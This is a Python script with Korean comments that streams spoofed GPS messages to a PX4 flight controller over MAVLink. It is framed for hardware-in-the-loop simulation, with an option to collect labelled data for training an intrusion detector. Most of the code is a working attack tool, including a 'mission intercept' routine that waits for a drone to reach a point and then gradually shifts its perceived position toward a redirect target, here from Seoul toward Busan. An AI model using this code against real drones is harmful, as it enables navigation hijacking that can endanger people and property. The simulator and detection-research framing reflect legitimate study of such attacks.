#!/usr/bin/env python3
"""
HITL UDP GPS 스푸핑 - 실제 플라이트 컨트롤러용
PX4 v1.14 + X-Plane 12 환경
"""
import os
os.environ['MAVLINK20'] = '1'

import time
import math
import threading
from pymavlink import mavutil

class HITLGPSSpoofer:
    def __init__(self, connection_string='udpout:127.0.0.1:14550',
                 source_system=1, source_component=191):
        """
        HITL 모드용 GPS 스푸퍼
        
        Args:
            connection_string: FC 연결 문자열
            - USB: '/dev/ttyACM0' 또는 'COM3'
            - UDP: 'udpout:127.0.0.1:14550'
        """
        self.master = mavutil.mavlink_connection(
            connection_string,
            source_system=source_system,
            source_component=source_component
        )
        self.boot_time = time.time()
        self.running = False
        self.current_spoof_pos = None
        self.gps_thread = None
        
    def wait_heartbeat(self):
        print("플라이트 컨트롤러 연결 대기...")
        self.master.wait_heartbeat()
        print(f"연결됨 System: {self.master.target_system}")
        
    def check_hitl_params(self):
        """HITL 파라미터 확인"""
        # MAV_USEHILGPS 파라미터 요청
        self.master.mav.param_request_read_send(
            self.master.target_system,
            self.master.target_component,
            b'MAV_USEHILGPS',
            -1
        )
        
        msg = self.master.recv_match(type='PARAM_VALUE', blocking=True, timeout=3)
        if msg and msg.param_id == 'MAV_USEHILGPS':
            if msg.param_value == 0:
                print("경고: MAV_USEHILGPS=0. GPS 스푸핑이 작동하지 않을 수 있습니다.")
                print("설정 명령: param set MAV_USEHILGPS 1")
            else:
                print("MAV_USEHILGPS=1 확인됨")
                
    def get_timestamp_us(self):
        """안전한 uint64 타임스탬프"""
        return int((time.time() - self.boot_time) * 1e6) & 0xFFFFFFFFFFFFFFFF
        
    def send_hil_gps(self, lat_deg, lon_deg, alt_m,
                     vn_ms=0.0, ve_ms=0.0, vd_ms=0.0,
                     fix_type=3, satellites=12, hdop=1.0, vdop=1.0):
        """
        완전한 HIL_GPS 메시지 송신
        
        모든 파라미터 범위 검증 포함 (struct.error 방지)
        """
        # 범위 검증 및 변환
        lat_e7 = max(-900000000, min(900000000, int(lat_deg * 1e7)))
        lon_e7 = max(-1800000000, min(1800000000, int(lon_deg * 1e7)))
        alt_mm = max(-1000000000, min(1000000000, int(alt_m * 1000)))
        
        # 속도 변환 (m/s → cm/s), int16 범위 제한
        vn_cms = max(-32768, min(32767, int(vn_ms * 100)))
        ve_cms = max(-32768, min(32767, int(ve_ms * 100)))
        vd_cms = max(-32768, min(32767, int(vd_ms * 100)))
        
        # 지상 속도 (uint16)
        ground_speed = math.sqrt(vn_ms**2 + ve_ms**2)
        vel_cms = max(0, min(65535, int(ground_speed * 100)))
        
        # DOP (uint16, *100)
        eph = max(0, min(65535, int(hdop * 100)))
        epv = max(0, min(65535, int(vdop * 100)))
        
        # 진행 방향 (cdeg, 0-35999)
        if ground_speed > 0.1:
            cog = int(math.degrees(math.atan2(ve_ms, vn_ms)) * 100) % 36000
        else:
            cog = 0
            
        self.master.mav.hil_gps_send(
            self.get_timestamp_us(),
            fix_type,
            lat_e7,
            lon_e7,
            alt_mm,
            eph,
            epv,
            vel_cms,
            vn_cms,
            ve_cms,
            vd_cms,
            cog,
            satellites
        )
        
    def _gps_stream_thread(self, rate_hz):
        """백그라운드 GPS 스트림 스레드"""
        interval = 1.0 / rate_hz
        while self.running:
            if self.current_spoof_pos:
                lat, lon, alt = self.current_spoof_pos
                self.send_hil_gps(lat, lon, alt)
            time.sleep(interval)
            
    def start_gps_stream(self, lat, lon, alt, rate_hz=50):
        """
        백그라운드 GPS 스트림 시작
        
        Args:
            rate_hz: 전송 빈도 (권장: 40-70Hz)
        """
        self.current_spoof_pos = (lat, lon, alt)
        self.running = True
        self.gps_thread = threading.Thread(
            target=self._gps_stream_thread,
            args=(rate_hz,),
            daemon=True
        )
        self.gps_thread.start()
        print(f"GPS 스트림 시작: {rate_hz}Hz")
        
    def update_spoof_position(self, lat, lon, alt):
        """실시간 스푸핑 위치 업데이트"""
        self.current_spoof_pos = (lat, lon, alt)
        
    def stop_gps_stream(self):
        """GPS 스트림 중지"""
        self.running = False
        if self.gps_thread:
            self.gps_thread.join(timeout=2)
        print("GPS 스트림 중지됨")
        
    def mission_intercept_spoof(self, intercept_lat, intercept_lon, 
                                redirect_lat, redirect_lon,
                                redirect_alt=50.0,
                                detection_radius_m=50.0):
        """
        미션 비행 중 GPS 스푸핑 시나리오
        
        드론이 특정 위치에 도달하면 가짜 위치로 리디렉션
        """
        print(f"가로채기 위치: {intercept_lat}, {intercept_lon}")
        print(f"리디렉션 위치: {redirect_lat}, {redirect_lon}")
        print("드론 위치 모니터링 중...")
        
        # 정상 GPS 스트림 시작 (오프셋 없음)
        self.start_gps_stream(intercept_lat, intercept_lon, redirect_alt, rate_hz=50)
        
        while True:
            # 현재 드론 위치 수신
            msg = self.master.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=1)
            if not msg:
                continue
                
            drone_lat = msg.lat / 1e7
            drone_lon = msg.lon / 1e7
            
            # 거리 계산 (간단한 근사)
            dlat = (drone_lat - intercept_lat) * 111320
            dlon = (drone_lon - intercept_lon) * 111320 * math.cos(math.radians(drone_lat))
            distance = math.sqrt(dlat**2 + dlon**2)
            
            if distance < detection_radius_m:
                print(f"가로채기 지점 도달! 거리: {distance:.1f}m")
                print("점진적 리디렉션 시작...")
                
                # 점진적 스푸핑 (30초에 걸쳐)
                steps = 300
                for i in range(steps):
                    progress = i / steps
                    new_lat = drone_lat + (redirect_lat - drone_lat) * progress
                    new_lon = drone_lon + (redirect_lon - drone_lon) * progress
                    self.update_spoof_position(new_lat, new_lon, redirect_alt)
                    time.sleep(0.1)
                    
                print("리디렉션 완료!")
                break
                
            time.sleep(0.5)
            
    def data_collection_mode(self, duration_s=300, output_file='gps_spoof_data.csv'):
        """
        IDS 학습용 데이터 수집 모드
        
        정상 및 스푸핑 GPS 데이터를 CSV로 저장
        """
        import csv
        
        print(f"데이터 수집 시작: {duration_s}초, 출력: {output_file}")
        
        with open(output_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'timestamp', 'label',
                'lat', 'lon', 'alt',
                'vn', 've', 'vd',
                'hdop', 'satellites',
                'spoof_lat', 'spoof_lon', 'spoof_alt'
            ])
            
            start_time = time.time()
            spoof_active = False
            
            while (time.time() - start_time) < duration_s:
                elapsed = time.time() - start_time
                
                # 50% 지점에서 스푸핑 시작
                if elapsed > duration_s * 0.5 and not spoof_active:
                    spoof_active = True
                    print("스푸핑 활성화!")
                    self.start_gps_stream(37.0, 127.0, 100.0)
                    
                msg = self.master.recv_match(type='GPS_RAW_INT', blocking=True, timeout=1)
                if msg:
                    spoof_pos = self.current_spoof_pos or (0, 0, 0)
                    writer.writerow([
                        time.time(),
                        'spoofed' if spoof_active else 'normal',
                        msg.lat / 1e7, msg.lon / 1e7, msg.alt / 1000,
                        0, 0, 0,  # 속도 (별도 메시지에서)
                        msg.eph / 100, msg.satellites_visible,
                        spoof_pos[0], spoof_pos[1], spoof_pos[2]
                    ])
                    
        self.stop_gps_stream()
        print(f"데이터 저장 완료: {output_file}")

def main():
    print("=== HITL UDP GPS 스푸핑 (권장 모드) ===")
    print()
    print("사전 설정:")
    print("  FC 콘솔에서: param set MAV_USEHILGPS 1")
    print("  또는 HITL 모드: param set SYS_HITL 1")
    print()
    
    # USB 직접 연결 예시
    # spoofer = HITLGPSSpoofer('/dev/ttyACM0', baud=57600)
    
    # UDP 연결 (mavlink-router 통해)
    spoofer = HITLGPSSpoofer('udpout:127.0.0.1:14550')
    spoofer.wait_heartbeat()
    spoofer.check_hitl_params()
    
    print("\n모드 선택:")
    print("1. 기본 GPS 스푸핑")
    print("2. 미션 가로채기 스푸핑")
    print("3. IDS 데이터 수집")
    
    mode = input("선택 (1-3): ").strip()
    
    if mode == '1':
        # 기본 스푸핑
        spoofer.start_gps_stream(
            lat=35.1796,   # 부산
            lon=129.0756,
            alt=100.0,
            rate_hz=50
        )
        print("Ctrl+C로 종료")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            spoofer.stop_gps_stream()
            
    elif mode == '2':
        # 미션 가로채기
        spoofer.mission_intercept_spoof(
            intercept_lat=37.5665,    # 서울 (가로채기 지점)
            intercept_lon=126.9780,
            redirect_lat=35.1796,      # 부산 (리디렉션 목표)
            redirect_lon=129.0756,
            redirect_alt=50.0
        )
        
    elif mode == '3':
        # 데이터 수집
        spoofer.data_collection_mode(
            duration_s=600,
            output_file='gps_ids_training_data.csv'
        )

if __name__ == "__main__":
    main()